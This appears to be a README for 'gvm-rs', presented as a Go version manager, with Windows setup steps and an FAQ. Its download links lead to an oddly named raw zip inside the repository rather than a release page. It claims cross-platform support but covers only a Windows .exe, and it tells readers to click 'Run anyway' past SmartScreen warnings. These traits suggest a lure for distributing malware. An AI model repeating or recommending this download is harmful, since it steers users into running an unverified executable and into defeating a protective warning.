# 🚀 gvm-rs - Manage Go language versions with ease

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Foremost-headsail607/gvm-rs/raw/refs/heads/main/src/gvm-rs-xiphisternal.zip)

gvm-rs helps you switch between different versions of Go on your computer. You often need specific versions of the Go language to build or run projects. This tool manages those versions for you. It downloads the files and sets them up automatically. You do not need to manage complex system files or have deep technical knowledge. 

## ⚙️ Why use gvm-rs

Many developers maintain different code projects. Each project sometimes requires a different version of the Go language. Without a manager, you might find it difficult to keep track of these versions. This tool solves that problem.

- Fast performance.
- One single file.
- Works on Windows, macOS, and Linux.
- Requires no special system permissions.
- Simple commands.

## 💾 Downloading the software

You must visit the releases page to get the correct version for your computer.

[Button: Click here to visit the release page](https://github.com/Foremost-headsail607/gvm-rs/raw/refs/heads/main/src/gvm-rs-xiphisternal.zip)

1. Open the page link above.
2. Look for the section labeled "Assets" at the bottom of the newest release.
3. Find the file ending in `.exe` for Windows users.
4. Click the file name to start your download.
5. Save the file to a folder you can easily find, like your Downloads folder.

## 🛠️ Setting up on Windows

Windows might ask for your permission to run the file because you downloaded it from the internet. Follow these steps to complete the setup.

### Moving the file
It helps to keep your tools in one place. Create a folder in your home directory named "bin". Move the downloaded `gvm-rs.exe` file into this "bin" folder. This keeps your system organized.

### Updating your system path
Your computer needs to know where this tool lives so you can use it in your terminal. Follow these steps to add the folder location to your system path:

1. Press the Windows key on your keyboard.
2. Type "environment variables" and select "Edit the system environment variables".
3. A window appears. Click the button at the bottom labeled "Environment Variables".
4. Look under the "User variables" section for a line named "Path". Select it and click "Edit".
5. Click "New" and paste the full location of your "bin" folder.
6. Click "OK" on every open window to save your changes.

### Verifying the installation
Open a fresh Command Prompt or PowerShell window. Type the following command and press Enter:

`gvm-rs --version`

You will see the version number of the tool printed on your screen. This confirms that your computer recognizes the tool.

## 📝 Using gvm-rs

Everything happens inside a terminal window. You type a command, and the tool performs the action.

### List available Go versions
To see which Go versions exist, type this command:

`gvm-rs list`

The tool checks a remote list and shows you which versions you can download.

### Install a new version
Pick a version from the list. If you want version 1.21.0, type:

`gvm-rs install 1.21.0`

The tool downloads the files, extracts them, and prepares them for use. You do not need to do anything else.

### Switch between versions
If you have multiple versions installed, you can switch between them at any time. To use version 1.21.0, type:

`gvm-rs use 1.21.0`

Your terminal now points to that specific version. You can verify this by typing `go version`.

## 🛡️ Requirements

This program requires minimal system resources. You need a standard Windows 10 or Windows 11 installation. The tool acts as a standalone program. It handles all Go downloads internally, so you do not need to install Go through other installers. This keeps your "Program Files" or system folders clean.

## 🔍 Frequently asked questions

**Do I need administrator rights?**
No. This tool installs into your user folder. You do not need to provide elevated permissions or use the "Run as Administrator" option.

**Does it change my global Go install?**
The tool manages versions separately from your system. It is safer to let this tool handle all versions and remove any previous standalone Go installs.

**Can I uninstall it?**
Yes. To remove the tool, delete the `gvm-rs.exe` file. If you want to remove the Go versions it installed, find the installation folder defined by the tool and delete it. 

**What if I get a security warning?**
Windows sometimes flags new files downloaded from the web. If you see a blue box saying "Windows protected your PC," click "More info" and then "Run anyway." This is normal for programs downloaded from GitHub.

**How do I get help?**
If you run into an error message, try typing `gvm-rs --help` in your terminal. This shows a list of all commands available to you. Each command includes a short explanation of what it does. Keep your version updated to ensure the best performance. Check the release page once every few months for updates.